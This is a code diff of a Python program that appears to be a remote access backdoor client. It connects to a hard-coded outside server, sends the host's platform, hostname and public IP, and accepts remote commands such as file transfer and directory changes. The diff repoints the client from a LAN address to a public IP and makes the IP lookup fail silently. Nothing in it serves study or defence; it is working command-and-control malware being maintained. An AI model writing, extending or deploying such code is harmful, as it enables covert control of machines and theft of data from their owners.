@@ -8,7 +8,7 @@ import os
 from sys import executable, argv
 import subprocess
 
-ip_server = "192.168.43.187"
+ip_server = "147.161.8.230"
 port_server = 1234
 system_info = {}
 
@@ -28,7 +28,10 @@ def send_system_info():
     system_info['platform-version']= version()
     system_info['architecture']= machine()
     system_info['hostname']= socket.gethostname()
-    system_info["public_ip"] = get('https://api.ipify.org').text
+    try:
+        system_info["public_ip"] = get('https://api.ipify.org').text
+    except:
+        pass
     
     json_sys = json.dumps(system_info)
     sock.send(bytes(json_sys, "utf-8"))
@@ -72,8 +75,6 @@ def wait_command():
                 data = sock.recv(size)
                 file.write(data)
                 file.close()   
-
-
 
             elif array_command[0] == "cd":
                 try:
